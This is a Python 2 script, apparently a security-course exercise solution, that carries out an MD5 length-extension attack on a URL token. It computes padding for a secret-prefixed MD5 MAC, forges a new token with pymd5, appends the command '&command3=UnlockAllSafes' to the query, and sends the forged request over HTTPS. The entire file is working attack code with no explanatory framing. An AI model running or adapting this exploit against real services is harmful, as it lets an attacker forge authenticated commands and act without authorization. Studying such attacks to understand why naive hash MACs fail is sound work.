import pymd5, sys, httplib, urllib, urlparse

url = sys.argv[1]
parsedUrl = urlparse.urlparse(url)
urlprefix = parsedUrl.scheme + "://" + parsedUrl.netloc + parsedUrl.path + '?'

string = parsedUrl.query

assert string[0:6] == "token="

for i in range(0,len(string)):
    if string[i]=='&':
        token = string[6:i]
        message = string[i+1:]
        break

secret = "password"
attack = "&command3=UnlockAllSafes"  # attack command

pad = pymd5.padding(len(secret+message)*8)

h = pymd5.md5(attack,state=token.decode("hex"),count=512)
token_attack = h.hexdigest()

urlprefix = urlprefix + "token="
message = message + urllib.quote(pad)+attack  # QUOTE is super important!
url = urlprefix + token_attack + "&" + message

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname, parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
